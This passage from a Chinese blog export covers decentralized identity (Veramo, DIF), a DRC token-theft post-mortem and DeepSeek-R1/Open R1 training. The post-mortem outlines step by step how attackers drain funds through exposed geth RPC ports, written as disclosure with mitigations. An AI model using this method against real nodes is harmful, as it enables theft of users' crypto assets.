<li>IETF - <a href="https://datatracker.ietf.org/doc/draft-ietf-oauth-sd-jwt-vc/">SD-JWT VC</a>, <a href="https://datatracker.ietf.org/doc/draft-ietf-oauth-selective-disclosure-jwt/">SD-JWT</a> </li>
<li> <a href="https://openid.net/">OpenID</a> - <a href="https://openid.net/sg/openid4vc/libraries/">OIDC 4 VCI, OIDC 4 VP</a></li>
</ol>
]]></content>
      <tags>
        <tag>DID</tag>
      </tags>
  </entry>
  <entry>
    <title>DID-veramo</title>
    <url>/2022/12/26/DID-veramo/</url>
    <content><![CDATA[<p>Veramo 中的功能是通过插件系统添加到代理中的。</p>
<h3 id="Plugins-Architecture"><a href="#Plugins-Architecture" class="headerlink" title="Plugins Architecture"></a><a href="https://veramo.io/docs/veramo_agent/plugins">Plugins Architecture</a></h3><p><img src="/2022/12/26/DID-veramo/1.jpeg"></p>
<h3 id="DID-Methods"><a href="#DID-Methods" class="headerlink" title="DID Methods"></a>DID Methods</h3><p><img src="/2022/12/26/DID-veramo/2.jpeg" alt="DIDs and DID documents are recorded on a Verifiable Data Registry; DIDs resolve   to DID documents; DIDs refer to DID subjects; a DID controller controls a DID document; DID URLs contains a DID; DID URLs dereferenced to DID document fragments or external resources; DID resolver implements resolve function; DID URL dereferencer implements dereferencing function; DID method operates a   Verfiable Data Registry; DID resolver and DID URL dereferencer instruct a DID method."></p>
<h3 id="Core-Supported-DID-Methods"><a href="#Core-Supported-DID-Methods" class="headerlink" title="Core Supported DID Methods"></a>Core Supported DID Methods</h3><p>Veramo 核心插件支持以下 did 方法。</p>
<h3 id="did-ethr"><a href="#did-ethr" class="headerlink" title="did:ethr"></a><code>did:ethr</code></h3><p><code>did:ethr:0xc530503a148babcaca68565cfa576d6f43427a2d</code></p>
<p>Ethr-DID 为以太坊地址提供了一种可扩展的身份识别方法，使任何以太坊地址都能够收集链上和链下数据。因为 Ethr-DID 允许任何以太坊密钥对成为身份，所以它比基于智能合约的身份方法更具可扩展性和隐私保护性。</p>
<p>这种特殊的 DID 方法依赖于 ethr-did-registry。 ethr-did-registry 是一个智能合约，可以促进链下（和链上）身份验证的公钥解析。 它还有助于密钥轮换、委托分配和撤销以允许第 3 方签名者，以及设置和撤销链下属性数据。 这些交互和事件被聚合使用以使用 ethr-did-resolver 构建 DID 文档。</p>
<h3 id="did-web"><a href="#did-web" class="headerlink" title="did:web"></a><code>did:web</code></h3><p><code>did:web:veramo-agent.herokuapp.com</code></p>
<p>Web-DID 利用域名系统，允许 Web 来源的所有者将其转换为 DID。创建 Web-DID 就像创建 DID 文档并将其托管在众所周知的 URL 下一样简单。 每次解析 DID 时，DID 文档都必须通过 HTTPS GET 可用。 这意味着创建一个 DID，不需要区块链，但它有一定的权衡。 Web-DID 的安全性通过实施 TLS 植根于现有的互联网 PKI。 Web-DID 可以直接托管在网络域的众所周知的 URL 下，例如 <a href="http://www.example.com/.well-known/did.json%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%89%98%E7%AE%A1%E5%9C%A8%E7%89%B9%E5%AE%9A%E7%9A%84%E5%AD%90%E8%B7%AF%E5%BE%84%E4%B8%8B%E3%80%82%E4%BD%BF%E7%94%A8%E5%AD%90%E8%B7%AF%E5%BE%84%E5%85%81%E8%AE%B8%E5%9C%A8%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E5%9F%9F%E4%B8%8B%E6%89%98%E7%AE%A1%E5%A4%9A%E4%B8%AA">www.example.com/.well-known/did.json，也可以托管在特定的子路径下。使用子路径允许在一个网络域下托管多个</a> DID。此方法还可用于允许 Web 应用程序为其用户创建 Web-DID，例如 <a href="http://www.example.com/users/username/.well-known/did.json%E3%80%82">www.example.com/users/username/.well-known/did.json。</a></p>
<p>虽然 Web-DID 是一种非常有用的技术，可以将 Web2 连接到 Web3，并且特别允许公司非常轻松地创建他们的 DID，但它在安全和隐私方面存在一些缺点（例如，跟踪）。</p>
<h3 id="did-key"><a href="#did-key" class="headerlink" title="did:key"></a><code>did:key</code></h3><p>did: key:z6MkpTHR8VNsBxYAAWHut2Geadd9jSwuBV8xRoAnwWsdvktH</p>
<p>Key-DID 代表了一种非常轻量级的自我证明 DID 方法，它不需要任何外部实用程序，例如区块链。Key-DID 是通过生成加密密钥对（例如，Curve25519）创建的。使用 Curve25519 将自动向 DID 文档添加两个条目，可用于 EdDSA（即 Ed25519）和 ECDH/加密（即，使用 X25519）。Key-DID 始终解析为相同的 DID 文档，并且由于它是不可变的，所以添加服务端点和其他密钥是不可能的。</p>
<h3 id="Message-Handlers"><a href="#Message-Handlers" class="headerlink" title="Message Handlers"></a>Message Handlers</h3><p>创建代理实例时，您指定要使用的消息处理程序以及调用它们的顺序。例如，如果您的应用程序从 QR 码捕获可验证凭证，其中数据被编码为 JWT，您将在代理设置中按顺序指定 <strong>url</strong>、<strong>did-comm</strong>、<strong>did-jwt</strong> 和 <strong>credential-w3c</strong> 处理程序。</p>
<h3 id="url"><a href="#url" class="headerlink" title="url"></a><code>url</code></h3><p>UrlMessageHandler 解析来自 URL 的消息，通常来自查询字符串。进一步的解析可能在 JWT 和/或 DIDComm 处理程序中执行。该处理程序支持获取缩短的 URL 重定向。</p>
<h3 id="did-comm"><a href="#did-comm" class="headerlink" title="did-comm"></a><code>did-comm</code></h3><p>DIDCommMessageHandler 使用收件人的私钥解密传入的消息。 解密的消息将传递给后续的消息处理程序。</p>
<p><img src="/2022/12/26/DID-veramo/3.jpeg"></p>
<h3 id="did-jwt"><a href="#did-jwt" class="headerlink" title="did-jwt"></a><code>did-jwt</code></h3><p>JWT MessageHandler 解码 JWT 并创建消息对象。</p>
<p><img src="/2022/12/26/DID-veramo/4.jpeg"></p>
<h3 id="credential-w3c"><a href="#credential-w3c" class="headerlink" title="credential-w3c"></a><code>credential-w3c</code></h3><p>W3CMessageHandler 检查可验证凭证和可验证演示的消息有效负载，并相应地格式化消息对象。</p>
<p><img src="/2022/12/26/DID-veramo/5.jpeg"></p>
]]></content>
      <tags>
        <tag>DID</tag>
      </tags>
  </entry>
  <entry>
    <title>Decentralized Identity Foundation first anniversary</title>
    <url>/2018/06/02/Decentralized-Identity-Foundation-first-anniversary/</url>
    <content><![CDATA[<p><a href="http://note.youdao.com/noteshare?id=40a9c148897c69d4e65cafd722ff57d3">Decentralized Identity Foundation Grows To 56 Members In Our First Year</a></p>
<p>May 23, 2018 marks the <a href="http://identity.foundation/">Decentralized Identity Foundation</a>’s first anniversary. Over the past year, DIF has grown from a handful of founding organizations to 56 members. Together, we’re working to shape the future of decentralized identity technology and standards.</p>
<p><img src="/2018/06/02/Decentralized-Identity-Foundation-first-anniversary/1.jpeg"></p>
<h4 id="Technology-Under-Development"><a href="#Technology-Under-Development" class="headerlink" title="Technology Under Development"></a>Technology Under Development</h4><p>DIF members are working together to build a variety of technologies. Much of this work is being done in collaboration with the larger open source community through the W3C and events such as Rebooting Web of Trust and the Internet Identity Workshop.</p>
<h4 id="Decentralized-Identifiers-DIDs"><a href="#Decentralized-Identifiers-DIDs" class="headerlink" title="Decentralized Identifiers (DIDs)"></a>Decentralized Identifiers (DIDs)</h4><p><a href="https://w3c-ccg.github.io/did-spec/">Decentralized Identifiers (DIDs)</a> are a new type of identifier for verifiable, “self-sovereign” digital identity. DIDs are fully under the control of their owner, independent from any centralized registry, identity provider, or certificate authority.</p>
<h4 id="Universal-Resolver"><a href="#Universal-Resolver" class="headerlink" title="Universal Resolver"></a>Universal Resolver</h4><p>The <a href="https://github.com/decentralized-identity/universal-resolver">Universal Resolver</a> is similar to Bind in the DNS system. However, instead of working with domain names, it works with self-sovereign identifiers that can be created and registered directly by their owners. This project was organized by DIF members with funding from British Columbia.</p>
<h4 id="Chainpoint"><a href="#Chainpoint" class="headerlink" title="Chainpoint"></a>Chainpoint</h4><p><a href="http://chaipoint.org/">Chainpoint</a> is an open standard for anchoring data to a blockchain and creating a timestamp proof.</p>
<h4 id="Hubs"><a href="#Hubs" class="headerlink" title="Hubs"></a>Hubs</h4><p><a href="https://github.com/decentralized-identity/hubs/">Hubs</a> are datastores containing semantic data objects at well-known locations. Each object in a Hub is signed by an identity and accessible via a globally recognized API format that explicitly maps to semantic data objects. Hubs are addressable via unique identifiers maintained in a global namespace. Several members within DIF have announced work on hub implementations, including Microsoft and <a href="https://sovrin.org/">Sovrin</a>.</p>
<h4 id="DIF-Steering-Committee-Members"><a href="#DIF-Steering-Committee-Members" class="headerlink" title="DIF Steering Committee Members"></a>DIF Steering Committee Members</h4><p>We’d like to thank the following Steering Committee members for providing leadership and helping DIF grow over the past year.</p>
<ul>
<li><p><a href="https://www.linkedin.com/in/drummondreed/">Drummond Reed</a> — Chief Trust Officer, <a href="https://www.evernym.com/">Evernym</a></p>
</li>
<li><p><a href="https://www.linkedin.com/in/rouvenheck/">Rouven Heck</a> — Co-Founder &amp; Project Lead, <a href="http://uport.me/">uPort</a></p>
</li>
<li><p><a href="https://www.linkedin.com/in/ryaneshea/">Ryan Shea</a> — Co-founder, <a href="http://blockstack.org/">Blockstack</a></p>
</li>
<li><p><a href="https://www.linkedin.com/in/muneebali/">Muneeb Ali</a> — Co-founder, Blockstack</p>
</li>
<li><p><a href="https://www.linkedin.com/in/wayne/">Wayne Vaughan</a> — Chief Executive Officer, <a href="http://tierion.com/">Tierion</a></p>
</li>
<li><p><a href="https://www.linkedin.com/in/dbuchner/">Daniel Buchner</a> — Senior PM, Decentralized Identity, Microsoft</p>
</li>
<li><p><a href="https://www.linkedin.com/in/sivakannan/">Siva Kannan </a>— Chief Software Development Officer, <a href="http://gem.co/">Gem</a></p>
</li>
<li><p><a href="https://www.linkedin.com/in/imthedoctor/">Matt Smith </a>— Software Architect, Gem</p>
</li>
<li><p><a href="https://www.linkedin.com/in/vinomaster/">Dan Gisolfi</a> — CTO Trusted Identity |Distinguished Engineer, IBM</p>
</li>
</ul>
<h4 id="More-Projects-companies-working-on-blockchain-and-identity"><a href="#More-Projects-companies-working-on-blockchain-and-identity" class="headerlink" title="More Projects/companies working on blockchain and identity"></a>More Projects/companies working on blockchain and identity</h4><p><a href="https://github.com/peacekeeper/blockchain-identity">More Projects/companies working on blockchain and identity. </a></p>
]]></content>
      <tags>
        <tag>DID</tag>
      </tags>
  </entry>
  <entry>
    <title>DRC积极应对智能合约账户遭受黑客攻击事件</title>
    <url>/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<p>本文内容比原文略微变更：</p>
<p><a href="https://mp.weixin.qq.com/s/kTunEa9AdO3mTlBp0Np5-g">https://mp.weixin.qq.com/s/kTunEa9AdO3mTlBp0Np5-g</a></p>
<p>3月15日，DRC智能合约账户遭受黑客攻击，导致账户内的DRC Token被盗。DRC开发人员及时对该黑客钱包地址中的DRC Token进行了锁定，这部分代币将无法被转出。所有DRC Token的持有者不会因此次事件而遭受经济损失。</p>
<p>在全面分析本次黑客攻击事件后，决定采取封禁原有代币及合约，重新部署新代币及智能合约。此前接收过DRC Token的用户（3,543 addresses），DRC将在部署新的代币合约后，按原区块链浏览器上的地址和代币数重新打币。原接收的DRC Token销毁后将作废。</p>
<p>在分析黑客行为的过程中，发现该黑客在过去一年时间内对多个区块链项目进行持续的偷盗，累计金额达2000万美金。尽管有多位受害曾经通过不同媒体发布相关报道，但黑客行动仍在继续。因此在此提醒区块链项目的开发团队能够引以为鉴，将代码合约安全放在首位。</p>
<h3 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h3><p>此次遭遇的安全漏洞，实际上在早在2015年Ethereum 团队就给出过安全提醒，一年前My Ether Wallet的Founder也在etherscan的这个黑客地址下留言解释过，并给出了建议。</p>
<p><a href="https://blog.ethereum.org/2015/08/29/security-alert-insecurely-configured-geth-can-make-funds-remotely-accessible/">https://blog.ethereum.org/2015/08/29/security-alert-insecurely-configured-geth-can-make-funds-remotely-accessible/</a></p>
<p>下面这个链接是以太坊官方reddit论坛上关于这个漏洞产生的实际问题的讨论：</p>
<p><a href="https://www.reddit.com/r/ethereum/comments/4z0mvi/ethereum_nodes_with_insecure_rpc_settings_are/">https://www.reddit.com/r/ethereum/comments/4z0mvi/ethereum_nodes_with_insecure_rpc_settings_are/</a></p>
<p><img src="/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/1.jpeg"></p>
<p>根据以太坊官方论坛讨论的内容以及我们对后台log的分析，这个安全漏洞的主要原理如下：</p>
<ol>
<li>使用geth或者parity客户端在本机创建一个全节点来同步以太坊区块，同时提供HTTP RPC API 方便其他地方的机器通过geth或者parity客户端访问，这样其他地方的geth或者parity不用重复的在本地同步区块。通常HTTP RPC API的访问是通过首先连接 xxx.xxx.xxx.xxx:8545 这个URL，然后就能访问诸如“eth_accounts”,”eth_sendTransaction”等API了。 8545是geth开启RPC服务的默认端口，xxx.xxx.xxx.xxx是这个全节点的可被外网访问的IP地址。</li>
</ol>
<p>2.这样做有安全漏洞，原因是黑客也可以连接这个服务，调用”eth_xxxxx”等API。举例来说，他会做下面三步操作：</p>
<p>1）首先call eth_getBlockByNumber(“0x00”, false)，因为本机同步了所有区块，所以这个调用可以得到本地同步的区块高度。</p>
<p>2）接下来调用eth_accounts API，可以通过这个API得到当前本机节点导入的所有以太坊账户的地址列表。</p>
<p>3） 然后通过所有账户地址对外发送eth_sendTransaction 调用，这个API调用可以发送该账户地址下的所有数字资产到一个指定的以太坊地址。</p>
<p>以上这三步可以不停的重复，几乎可以达到每秒调用一次，这样就有可能正好碰上本机用户对自己的钱包地址执行unlockAccount方法，这个方法将使用自己的密码从本地的keystore里获取private key对要发起的交易进行签名，从而成功交易。而unlock状态会保持一个短暂的时间，也就是在这个短暂的时间段内，用户不用再次输入密码为交易签名，在这个时间段内所有发起的交易都可以自动签名，因此，在这个时间段内如果恰好黑客用这个地址所发起的eth_sendTransaction调用被执行到，那么黑客就成功的获取用户的签名权限并将该钱包地址上的数字资产转走。而且一旦交易成功，黑客应该能通过某种方式获得整个签名加密的信息，从而完全控制这个账户，只要这个账户仍然在geth上连接，黑客就能一直用这个账户地址发起交易并签名成功，直到这个账户退出geth客户端。</p>
<p>这就是通过HTTP RPC API发动黑客攻击的具体过程。如果要想避免这种行为带来的危害，首先，不要用默认端口（8545）开启HTTP RPC服务，也不要对Internet全网开放。但即使这样做了，黑客仍然有可能通过别的方法获取到端口或者IP地址成功的连上RPC服务，那么这就要求全节点使用者在对外提供HTTP RPC API的时候，一定不能使用unlockAccount方法来解锁本地的账户地址，而要用其他方式进行签名交易，比如每次通过调用web3接口的函数发起交易的时候，使用密码文件作为参数在函数调用语句中签名，或调用web3提供的Sign函数接口去签名交易。unlockAccount方法只能在测试环境或者是不提供HTTP RPC API服务的主机上使用。</p>
<p>这个漏洞对geth提供的WS API应该也是有效的，因为WS服务也可以对外公开。</p>
<p>另外，根据这次教训，有一条原则就是拥有大量数字代币的账户一定不要用来作为在主网上调用各种接口和智能合约的主体，因为一旦遭受攻击就会损失大量代币。应该使用其他独立的账户地址做这些事情，通过代币合约提供的approve()方法从拥有代币的账户地址得到授权，然后用这个独立的账户地址（可以是另一个智能合约的地址）去执行transferFrom()方法来分发代币，因为这样一来该地址得到的授权额度是有限的，二来黑客使用的sendTransaction API调用是不能调用到transferFrom这个方法的，因此会更安全。</p>
<p>无论是对于普通用户还是团体账户，谨记不要让某一个账户的余额特别高，如果有存储高额余额的需要，最好用冷钱包。如上所述，可以用代币合约的授权方法，授权给一些账户可以交易的额度，让这些授权账户去做实际的交易，这样就能规避这种黑客攻击的风险。因为这些授权账户地址里是没有实际的代币的，只是代替有余额的冷钱包账户对外发币。</p>
<h3 id="黑客地址"><a href="#黑客地址" class="headerlink" title="黑客地址"></a>黑客地址</h3><p>该黑客的钱包地址为：</p>
<p><a href="0x957cD4Ff9b3894FC78b5134A8DC72b032fFbC464">0x957cD4Ff9b3894FC78b5134A8DC72b032fFbC464</a></p>
<p>谷歌和百度黑客的地址，发现有若干条关于该地址的记录，国内外都有受害者。</p>
<p><img src="/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/2.jpeg"></p>
<p>使用etherscan.io对黑客地址进行查看后发现：</p>
<p>1、地址最早的Token Transfer记录可回溯到2016年2月14日；</p>
<p>2、地址中存在大量尚未上市流通的代币，但也有超过50个已上市流通的代币；</p>
<p>3、在已上市流通的代币中，有3个代币的交易笔数较多，分别是：Minereum（420笔）、PlusCoin（97笔）、Soarcoin（49笔）；</p>
<p>4、除了两笔OUT外，其余均为IN。许多代币的转入具有固定模式：在同一时间段，以固定金额、固定笔数转入。例如，Minereum，每批次固定转入6笔，每批转入金额固定。</p>
<p>这种固定模式不仅发生在已上市流通的代币交易中，也广泛发生在未流通的代币交易中。因此，推测以这种模式转入的代币，亦为黑客盗取所得。</p>
<p>1、地址仅有的两笔OUT，是卖出soarcoin，一共卖掉了15278193.22 SOAR。其余关于soarcoin的记录均为转入，且累计转入=累计卖出。按照最后一笔卖掉的SOAR的价格，这个黑客变现了约42万美金；</p>
<p>2、地址中存在的可流通的代币里，价值最高的是UGT（约113万个，市值约65万美金），还有TNB（500万个，市值约13万美金）、NULS（约4万个，市值约10万美金）、KBR（约1万个，市值约6万美金）、OMG（约3千个，市值约3万美金）等。<br><img src="/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/6.jpeg"><br><img src="/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/7.jpeg"></p>
<p>我们诚恳邀请关注以太坊安全问题的读者，和我们一起深挖该黑客的行为路径。</p>
<p>黑客钱包地址：<a href="0x957cD4Ff9b3894FC78b5134A8DC72b032fFbC464">0x957cD4Ff9b3894FC78b5134A8DC72b032fFbC464</a></p>
<h3 id="DRC社区采取应对措施"><a href="#DRC社区采取应对措施" class="headerlink" title="DRC社区采取应对措施"></a>DRC社区采取应对措施</h3><p>区块链技术仍然处于一个非常早期阶段、技术壁垒高的行业，几乎所有的团队都在学习和探索中。DRC团队经历此次事件后，深刻体会到安全风险无处不在，代币智能合约的开发只有更细致、更严密和更谨慎。</p>
<p>我们全面、深刻地分析整个事件始末，并积极采取措施改善与提升技术和管理，应对措施要点如下：</p>
<p>1、我们将联合国内、外顶级的代码审计团队，对代码进行更严格的审查；</p>
<p>2、邀请专家共同探讨关于智能合约、网络安全、代币管理、帐户管理等一系列相关主题，以寻求建立更严谨、更规范的管理体系，更加重视并优化内部操作管理流程；</p>
<p>3、加强开发规范与管理，将更积极的学习有关智能合约和代币相关的安全注意事项，加入以太坊与安全相关社区和论坛，更快的知晓有哪些安全漏洞需要注意，提前规避风险；</p>
<p>4、开发人员将避免在提供RPC服务的全节点上执行类似unlockAccount方法的操作，而使用Web3的Sign接口函数在发起交易时实时的签名，以规避账户风险；</p>
<p>5、提议并倡导建立智能合约安全联盟，为改善区块链行业的安全现状，DRC呼吁并号召成立行业安全联盟，集合项目方、安全团队、极客团队等加入，联合发起安全联盟，推动行业健康发展。联合相关专家与团队共同发起《区块链行业安全联盟公约发起函》。</p>
<p>6、DRC生态建设基金愿出资2000万DRC作为安全联盟专家费用，促进区块链行业有关智能合约、网络安全、法律法规等专题讨论，也欢迎更多有此志向的区块链项目团队和专家共同出资共建。</p>
<p>我们将此次事件进行披露公开，虚心接受大家的批评和建议，请大家多多指正。也希望其他区块链项目的开发团队引以为鉴，防患于未然。将代码合约安全放在首位，发布前进行严密的系统测试，必要时要请外部专业团队进行测试。请加群秘微信 chiajung ，邀请进入社群作进一步沟通。</p>
<p>探讨的话题不限于以下内容：</p>
<p>1、智能合约中需要采取的必要安全措施</p>
<p>2、区块链项目遭受黑客攻击后的应对方案</p>
<p>3、智能合约中已知的安全漏洞</p>
<p>4、区块链项目对代币及资金安全的管理制度</p>
<p>5、相关的法律法规问题</p>
<p>附件：相关以太坊主要漏洞描述</p>
<p>如果智能合约开发者疏忽或者测试不充分，而造成智能合约的代码有漏洞的话，就非常容易被黑客利用并攻击。并且越是功能强大的智能合约，就越是逻辑复杂，也越容易出现逻辑上的漏洞。同时，智能合约语言Solidity自身与合约设计都可能存在漏洞。据有关调查统计，以太坊主要漏洞情况描述如下表：</p>
<p><img src="/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/3.jpeg"><br><img src="/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/4.jpeg"><br><img src="/2018/03/25/DRC%E7%A7%AF%E6%9E%81%E5%BA%94%E5%AF%B9%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E9%81%AD%E5%8F%97%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6/5.jpeg"></p>
<p>上述漏洞目前已经广泛存在以太坊网络中，2018年2月24日，新加坡和英国几位研究员指出，3.4万多份以太坊智能合约可能存在容易被攻击的漏洞，导致数百万美元以太币暴露在风险中，其中2,365份属于著名项目。</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>DeepSeek-R1的核心技术</title>
    <url>/2025/02/08/DeepSeek-R1%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="DeepSeek-R1的实施步骤"><a href="#DeepSeek-R1的实施步骤" class="headerlink" title="DeepSeek-R1的实施步骤"></a>DeepSeek-R1的实施步骤</h2><p><a href="https://huggingface.co/deepseek-ai/DeepSeek-R1">DeepSeek-R1</a>本身就是开源的，HuggingFace <a href="https://github.com/huggingface/open-r1">Open R1 项目</a> ，  <a href="https://github.com/simplescaling/s1">李飞飞团队s1项目</a> ， <a href="https://github.com/hkust-nlp/simpleRL-reason">simpleRL-reason</a> 在部分复现DeepSeek R1，还有 <a href="https://github.com/Jiayi-Pan/TinyZero">TinyZero 项目</a>在复现DeepSeek R1-Zero，又是为何？<br>根据 DeepSeek-R1 的技术报告，分3个步骤完成这个项目：</p>
<ul>
<li>第1步：用 DeepSeek-R1 蒸馏高质量语料库，来复制R1-Distill模型。</li>
<li>第2步：复制 DeepSeek (V3) 用来构建R1-Zero的纯强化学习（RL）pipeline。这可能涉及为数学、推理和代码整理新的大规模数据集。</li>
<li>第3步：通过多阶段训练，从基础模型过渡到RL版本。<br><img src="/2025/02/08/DeepSeek-R1%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/1.jpg"></li>
</ul>
<p>结合DeepSeek的官方技术报告来看，也就是说，Open R1项目首先要实现的，是用R1数据蒸馏小模型，看看效果是不是像DeepSeek说的那么好：</p>
<h2 id="DeepSeek-R1的实施效果"><a href="#DeepSeek-R1的实施效果" class="headerlink" title="DeepSeek-R1的实施效果"></a>DeepSeek-R1的实施效果</h2><p>DeepSeek开源了6个用R1蒸馏的小模型，其中蒸馏版Qwen-1.5甚至能在部分任务上超过GPT-4o。<br><img src="/2025/02/08/DeepSeek-R1%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/2.jpg"><br>接下来，就是按照DeepSeek所说，不用SFT，单纯依靠RL调教出R1-Zero，在R1-Zero的基础上复刻出性能逼近o1的R1模型。</p>
<p>其中R1技术报告讲到，DeepSeek-R1训练过程中引入了一个多阶段训练流程，具体包括以下4个阶段：</p>
<ol>
<li>冷启动<br> 用数千个长思维链（CoT）样本对基础模型进行监督微调（SFT），为模型提供初始的推理能力。</li>
<li>面向推理的强化学习<br> 在第一个SFT阶段的基础之上，用和训练R1-Zero相同的大规模强化学习方法，进一步提升模型的推理能力，特别是应对编程、数学、科学和逻辑推理任务的能力。</li>
<li>拒绝采样的监督微调<br> 再次使用监督微调（SFT），提升模型的非推理能力，如事实知识、对话能力等。</li>
<li>针对所有场景的强化学习<br> 这次强化学习的重点是让模型行为与人类偏好保持一致，提升模型的可用性和安全性。<h2 id="Open-R1做了什么？"><a href="#Open-R1做了什么？" class="headerlink" title="Open R1做了什么？"></a>Open R1做了什么？</h2>目前，在<a href="https://github.com/huggingface/open-r1">open-r1 GitHub仓库</a>中，已经可以看到这几个文件：</li>
</ol>
<ul>
<li><p>GRPO（Grouped Relative Policy Optimization）实现，<code>grpo.py</code>: trains a model with GRPO on a given dataset.<br>  在 Open R1 发布后，GRPO已整合至TRL最新版本（<a href="https://link.zhihu.com/?target=https://x.com/QGallouedec/status/1884978284686905468">v0.14</a>，Jan 30, 2025）。该整合方案支持使用单个或多个奖励函数模型进行模型训练。GRPO 实现方案深度集成了 DeepSpeed ZeRO 1/2/3 分布式训练框架以实现多 GPU 扩展，并采用 vLLM 加速生成过程——这正是在线训练方法的主要性能瓶颈。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> load_dataset</span><br><span class="line"><span class="keyword">from</span> trl <span class="keyword">import</span> GRPOConfig, GRPOTrainer</span><br><span class="line"></span><br><span class="line">dataset = load_dataset(<span class="string">&quot;trl-lib/tldr&quot;</span>, split=<span class="string">&quot;train&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dummy reward: rewards completions that are close to 20 characters</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reward_len</span>(<span class="params">completions, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [-<span class="built_in">abs</span>(<span class="number">20</span> - <span class="built_in">len</span>(completion)) <span class="keyword">for</span> completion <span class="keyword">in</span> completions]</span><br><span class="line"></span><br><span class="line">training_args = GRPOConfig(output_dir=<span class="string">&quot;Qwen2-0.5B-GRPO&quot;</span>, logging_steps=<span class="number">10</span>)</span><br><span class="line">trainer = GRPOTrainer(</span><br><span class="line">    model=<span class="string">&quot;Qwen/Qwen2-0.5B-Instruct&quot;</span>,</span><br><span class="line">    reward_funcs=reward_len,</span><br><span class="line">    args=training_args,</span><br><span class="line">    train_dataset=dataset,</span><br><span class="line">)</span><br><span class="line">trainer.train()</span><br><span class="line"><span class="comment"># (Feb 2nd)仍存在显存占用过高的问题，我们正在通过性能剖析进行优化改进。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>合成数据生成器，<code>generate.py</code>: generates synthetic data from a model using <a href="https://github.com/argilla-io/distilabel">Distilabel</a>.<br>  R1 技术报告中最引人注目的发现之一是：主模型可用于生成合成推理轨迹，而基于该数据集微调的较小模型可获得与主模型相近的性能提升。因此Open R1自然希望复现该合成推理数据集，使社区能够在其他模型上进行微调实验。<br>  面对 R1 这类超大模型，核心挑战在于高效扩展生成规模。Open R1花费一周时间尝试了多种配置方案：该模型可部署在 2 个 8xH100 节点（16 块 H100 GPU）上，我们最初基于此配置使用 vLLM 作为推理服务器。但很快发现该方案存在性能瓶颈：由于 GPU 的 KV 缓存快速耗尽，吞吐量未达最优且仅支持 8 路并行请求。当缓存耗尽时，占用大量缓存资源的请求会被抢占；若配置为<code>PreemptionMode.RECOMPUTE</code>模式，这些请求将在显存释放后重新调度。为此我们切换至 4x8xH100 节点配置（共 32 块 H100 GPU）。该方案为 32 路并行请求提供了充足的显存余量，基本避免了因 100% 缓存占用导致的请求重新调度问题。初始阶段我们采用批量请求查询 vLLM 服务器，但很快发现批次中的长尾样本会导致GPU利用率波动——新批次需等待前一批次最后一个样本完成后才能开始处理。将批量推理切换为流式处理后，GPU利用率显著稳定。<br><img src="/2025/02/08/DeepSeek-R1%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/3.jpg"></p>
<p>  该优化仅需修改vLLM服务器的请求发送代码。批量推理代码如下：</p>
